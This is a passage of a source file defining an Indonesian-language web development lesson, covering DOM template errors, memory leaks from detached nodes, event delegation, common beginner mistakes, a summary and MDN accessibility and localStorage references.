        'Fungsi `sinkronkan` di atas adalah bentuk paling sederhana dari rekonsiliasi, yaitu membandingkan keadaan yang diinginkan dengan yang ada di layar lalu mengubah selisihnya saja. `Map` id ke elemen adalah padanan dari `key` di React. Menulisnya sekali dengan tangan membuat materi Bab 5 dan seterusnya terbaca sebagai penyingkat pekerjaan yang sudah kamu pahami, bukan sebagai sihir.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Aplikasi kecil yang menggabungkan banyak bagian punya kegagalan gabungan juga. Empat berikut adalah yang paling sering muncul saat pola ini dipasang pertama kali.',
      ),
      code(
        'text',
        `
        const li = tpl.querySelector('.tugas');
        li.dataset.tugasId = tugas.id;
           ^

        TypeError: Cannot read properties of null (reading 'dataset')
        `,
        { caption: 'Isi `template` dicari lewat elemen templatenya, bukan lewat `content`.' },
      ),
      p(
        "Isi elemen `template` berada di pohon terpisah, sehingga `tpl.querySelector` tidak menemukan apa pun. Bentuk yang benar `tpl.content.firstElementChild` atau `tpl.content.querySelector('.tugas')`. Kesalahan ini muncul persis sekali per orang, dan setelah tahu penyebabnya tidak pernah terulang.",
      ),
      code(
        'text',
        `
        // Menyalin template tanpa argumen true.
        const li = tpl.content.firstElementChild.cloneNode();

        li.querySelector('.judul').textContent = tugas.judul;
           ^

        TypeError: Cannot read properties of null (reading 'textContent')
        `,
        { caption: '`cloneNode()` tanpa argumen hanya menyalin elemen terluarnya.' },
      ),
      p(
        '`cloneNode()` tanpa argumen menghasilkan elemen `li` kosong tanpa satu pun anak, sehingga pencarian `.judul` di dalamnya menghasilkan `null`. Argumen `true` berarti salin sampai ke seluruh keturunannya. Karena bentuk tanpa argumen jarang berguna, biasakan selalu menulis `cloneNode(true)` kecuali kamu memang sengaja hanya ingin cangkangnya.',
      ),
      code(
        'text',
        `
        // Setelah menghapus tugas lalu menambah tugas baru sepuluh kali:
        console.log(elemenTugas.size);   // 10
        console.log(daftarEl.children.length);   // 3

        // Tujuh elemen tertahan di memori tanpa ada di halaman.
        `,
        { caption: 'Peta tidak ikut dibersihkan saat elemennya dihapus.' },
      ),
      p(
        'Kalau `el.remove()` dipanggil tanpa `elemenTugas.delete(id)`, petanya terus memegang rujukan ke elemen yang sudah tidak ada di halaman. Elemen itu tidak bisa dibersihkan pengumpul sampah, dan pada sesi panjang jumlahnya menumpuk. Ini disebut node terlepas, dan tab Memory di DevTools bisa menghitungnya. Setiap struktur yang memegang elemen wajib punya jalur pembersihan yang sepasang dengan jalur penambahannya.',
      ),
      code(
        'text',
        `
        daftarEl.addEventListener('click', (e) => {
          hapus(e.target.dataset.tugasId);
        });

        Error: Tugas undefined tidak ditemukan
        `,
        { caption: 'Klik mengenai teks di dalam tombol, bukan tombolnya.' },
      ),
      p(
        'Sudah dibahas di Sub-bab 4.8 dan muncul lagi di sini karena aplikasi nyata hampir selalu punya elemen di dalam tombolnya. Selalu mulai dengan `e.target.closest(...)`, dan selalu beri penjaga keluar lebih awal. Dua baris itu menutup seluruh kelas bug delegasi, dan menuliskannya sudah layak menjadi kebiasaan otomatis.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`Cannot read properties of null (reading 'dataset')` pada template",
            'Dicari lewat elemen `template`, bukan lewat `content`',
            'Pakai `tpl.content.firstElementChild`',
          ],
          [
            'Salinan template kosong tanpa anak',
            '`cloneNode()` dipanggil tanpa `true`',
            'Tulis `cloneNode(true)`',
          ],
          [
            'Memori naik terus setelah banyak penghapusan',
            'Peta masih memegang elemen yang sudah dilepas',
            'Panggil `delete` pada peta setiap kali elemennya dihapus',
          ],
          [
            'Aksi terpicu dengan id `undefined`',
            '`e.target` bukan tombolnya',
            'Pakai `closest`, lalu penjaga keluar lebih awal',
          ],
          [
            'Fokus hilang tiap kali daftar diperbarui',
            'Seluruh daftar digambar ulang',
            'Perbarui hanya baris yang berubah',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Praktik penutup bab ini menggabungkan seluruh materi, jadi kesalahannya juga campuran. Yang dikumpulkan di bawah adalah yang muncul justru setelah aplikasinya sudah bekerja dan mulai dipakai orang lain.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menggambar ulang seluruh daftar dengan `innerHTML` tiap ada perubahan',
            'Paling sederhana dan hasilnya selalu benar',
            'Fokus keyboard hilang, posisi gulir melompat, teks yang sedang disorot batal, dan penangan peristiwa yang terpasang langsung ikut lenyap',
          ],
          [
            'Memakai indeks array sebagai penanda baris',
            'Indeksnya unik dan sudah tersedia',
            'Indeks berubah begitu ada yang dihapus, sehingga baris yang salah ikut diperbarui. Simpan id sungguhan di atribut data',
          ],
          [
            'Memakai `div` dengan penangan klik sebagai tombol',
            'Tampilannya bisa diatur lebih bebas',
            'Tidak bisa difokus keyboard, tidak dibacakan sebagai tombol, dan Enter tidak bekerja. Pakai `button` lalu atur gayanya',
          ],
          [
            'Menyimpan keadaan aplikasi di dalam DOM',
            'DOM sudah menampilkan keadaannya',
            'Membaca keadaan berarti membaca layar, dan keduanya bisa menyimpang. Simpan di JavaScript, dan biarkan DOM menjadi hasilnya',
          ],
          [
            'Menyimpan ke penyimpanan peramban pada tiap ketikan',
            'Supaya tidak ada yang hilang',
            'Menulis ke penyimpanan itu sinkron dan menahan tampilan. Tunda dengan debounce dari Bab 1',
          ],
          [
            'Menguji hanya dengan tiga tugas berjudul pendek',
            'Itu yang biasa dipakai',
            'Daftar kosong, judul sangat panjang, judul berisi tanda kurung sudut, dan seratus tugas adalah empat kasus yang paling sering merusak tampilan. Ujilah keempatnya',
          ],
        ],
      ),
      p(
        'Baris pertama layak ditegaskan sebagai penutup bab, sebab ia keputusan yang menentukan seluruh sisanya. Menggambar ulang semuanya memang selalu menghasilkan tampilan yang benar, dan itulah yang membuatnya menggoda. Yang hilang adalah segala hal yang tidak tersimpan di data, yaitu fokus, posisi gulir, pilihan teks, dan keadaan animasi. Kerangka kerja modern ada justru untuk memberi kemudahan menggambar ulang tanpa kehilangan itu semua, dan Bab 5 mulai membahasnya.',
      ),
      callout(
        'info',
        'Yang kamu bawa dari bab ini ke Bab 5',
        'Empat hal yang akan langsung terpakai. Pertama, data pengguna masuk lewat `textContent` bukan `innerHTML`. Kedua, perbarui yang berubah saja, dan itu yang disebut `key` di React. Ketiga, pasang penangan di induk yang stabil. Keempat, pakai elemen bawaan seperti `button` dan `form` supaya perilaku keyboard tidak perlu dibangun ulang.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Logika yang terpisah bisa diberi tampilan tanpa diubah — itu buktinya benar.',
        'Render dari data; jangan pernah menulis HTML dengan menyambung string.',
        'Satu listener dengan delegation menangani baris yang belum dibuat.',
        'Bedakan empty state yang berbeda penyebabnya.',
        'Perlakukan `localStorage` sebagai input tidak tepercaya.',
        'Di Frontend Intermediate, React akan mengotomatiskan `render()` — dan sekarang kamu tahu persis apa yang diotomatiskan.',
      ),
      references(
        {
          label: 'ARIA states and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Reference/Attributes',
          source: 'MDN',
          note: 'Rujukan `aria-live`, `aria-pressed`, dan `aria-label` yang dipakai di praktik ini.',
        },
        {
          label: 'Using ARIA: Roles, states, and properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Guides/Techniques',
          source: 'MDN',
          note: 'Termasuk aturan pertama ARIA: pakai elemen HTML bawaan dulu sebelum menambah ARIA.',
        },
        {
          label: 'Window.localStorage',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage',
          source: 'MDN',
          note: 'Termasuk kapan penulisan bisa gagal — dasar aturan "jangan telan kegagalan menyimpan".',
        },
        {
          label: 'JSON.parse()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse',
          source: 'MDN',
          note: 'Alasan hasilnya wajib divalidasi bentuknya — isi `localStorage` bisa diubah siapa saja.',
        },
        {
          label: 'Keyboard-navigable JavaScript widgets',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Accessibility/Guides/Keyboard-navigable_JavaScript_widgets',
          source: 'MDN',
          note: 'Dasar butir checklist "seluruh aplikasi bisa dipakai hanya dengan keyboard".',
        },
      ),
    ],
  ),
];
